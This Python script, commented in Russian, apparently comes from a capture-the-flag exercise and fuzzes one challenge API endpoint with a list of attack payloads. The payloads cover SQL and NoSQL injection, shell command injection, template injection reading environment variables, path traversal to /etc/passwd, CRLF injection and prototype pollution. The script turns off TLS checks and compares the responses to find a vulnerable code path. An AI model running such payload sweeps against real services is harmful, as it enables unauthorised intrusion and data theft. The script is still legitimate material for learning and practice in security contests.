#!/usr/bin/env python3
"""
probe27: dispatch payload exploration.
Гипотеза: SSRF тупик (OOB пуст). Может, там SSTI/CMDi/SQLi/NoSQLi/etc.
Ищем разницу в коде ответа (500 vs 502 vs 200), теле или тайминге, которая может сигналить
другую code-path.
"""
import json
import time
import urllib.request
import ssl

URL = "https://funicular-gm2cxozn.alfactf.ru/api/operator/dispatch"
HEADERS = {"Content-Type": "application/json", "User-Agent": "p27"}
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def call(body_json):
    body = body_json.encode()
    req = urllib.request.Request(URL, data=body, headers=HEADERS, method="POST")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=20) as resp:
            data = resp.read().decode("utf-8", "replace")
            return resp.status, time.time() - t0, data
    except urllib.error.HTTPError as e:
        try:
            data = e.read().decode("utf-8", "replace")
        except Exception:
            data = ""
        return e.code, time.time() - t0, data
    except Exception as e:
        return None, time.time() - t0, repr(e)

# Каждый case — описание, JSON-тело
CASES = [
    # baseline
    ("baseline", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    # пустые
    ("empty-obj", {}),
    ("empty-op", {"operation":"","packet":"","workOrder":"","terminal":""}),
    # нестандартные типы
    ("int-packet", {"operation":"plc-sync","packet":1,"workOrder":"WO-17-04","terminal":"OP-3"}),
    ("array-packet", {"operation":"plc-sync","packet":["south-line.2026-03-27"],"workOrder":"WO-17-04","terminal":"OP-3"}),
    ("obj-packet", {"operation":"plc-sync","packet":{"$ne":""},"workOrder":"WO-17-04","terminal":"OP-3"}),
    ("null-packet", {"operation":"plc-sync","packet":None,"workOrder":"WO-17-04","terminal":"OP-3"}),
    ("bool-packet", {"operation":"plc-sync","packet":True,"workOrder":"WO-17-04","terminal":"OP-3"}),
    # длинные
    ("long-packet", {"operation":"plc-sync","packet":"a"*10000,"workOrder":"WO-17-04","terminal":"OP-3"}),
    # CRLF / nul
    ("crlf-packet", {"operation":"plc-sync","packet":"south-line\r\nX-Inject: 1","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("nul-packet", {"operation":"plc-sync","packet":"south-line\x00.foo","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("space-packet", {"operation":"plc-sync","packet":"south line","workOrder":"WO-17-04","terminal":"OP-3"}),
    # SQL/cmd injection
    ("sqli", {"operation":"plc-sync","packet":"' OR '1'='1","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("cmdi-semi", {"operation":"plc-sync","packet":"south-line; id","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("cmdi-sub", {"operation":"plc-sync","packet":"south-line$(id)","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("cmdi-bt", {"operation":"plc-sync","packet":"south-line`id`","workOrder":"WO-17-04","terminal":"OP-3"}),
    # SSTI
    ("ssti-jinja", {"operation":"plc-sync","packet":"{{7*7}}","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("ssti-jsx", {"operation":"plc-sync","packet":"${7*7}","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("ssti-jsx-fn", {"operation":"plc-sync","packet":"${process.env}","workOrder":"WO-17-04","terminal":"OP-3"}),
    # ReDoS / format string
    ("ds-fs", {"operation":"plc-sync","packet":"%s%s%s%s%s%s","workOrder":"WO-17-04","terminal":"OP-3"}),
    # url с port
    ("url-with-creds", {"operation":"plc-sync","packet":"user:pass@plc-gateway:8080","workOrder":"WO-17-04","terminal":"OP-3"}),
    # путь
    ("path-traversal", {"operation":"plc-sync","packet":"../../../etc/passwd","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("file-scheme", {"operation":"plc-sync","packet":"file:///etc/passwd","workOrder":"WO-17-04","terminal":"OP-3"}),
    # известный валид packet — но изменим operation
    ("known-packet+restore-op", {"operation":"restore","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("known-packet+recover-op", {"operation":"recover","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("known-packet+backup-op", {"operation":"backup-restore","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("known-packet+plc-restore-op", {"operation":"plc-restore","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("unknown-op-baseline", {"operation":"unknown-foo","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    # injection в operation
    ("op-as-array", {"operation":["plc-sync"],"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    ("op-as-obj", {"operation":{"$ne":""},"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}),
    # extra поля
    ("extra-restore", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","restore":True}),
    ("extra-restored", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","restored":True}),
    ("extra-action", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","action":"restore"}),
    ("extra-bypass", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","bypass":True}),
    ("extra-internal", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","internal":True}),
    # null prototype
    ("proto-pollute-direct", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","__proto__":{"polluted":True}}),
    ("constr-pollute", {"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","constructor":{"prototype":{"polluted":True}}}),
]

print(f"# Cases: {len(CASES)}")
results = {}
for label, body_obj in CASES:
    try:
        body_json = json.dumps(body_obj)
    except Exception as e:
        print(f"[skip] {label}: {e}")
        continue
    st, dt, data = call(body_json)
    sig = (st, len(data), data[:80])
    print(f"[{st}] {dt:5.2f}s len={len(data):4d} {label}")
    if data and "Сервисный" not in data and "Неизвестное" not in data:
        print(f"     >> NEW BODY: {data[:300]!r}")
    results.setdefault(sig, []).append(label)
    time.sleep(0.5)

print("\n# Distinct response signatures:")
for sig, labels in results.items():
    st, ln, prev = sig
    print(f"\n  status={st}, len={ln}, body[:80]={prev!r}")
    for l in labels:
        print(f"    - {l}")
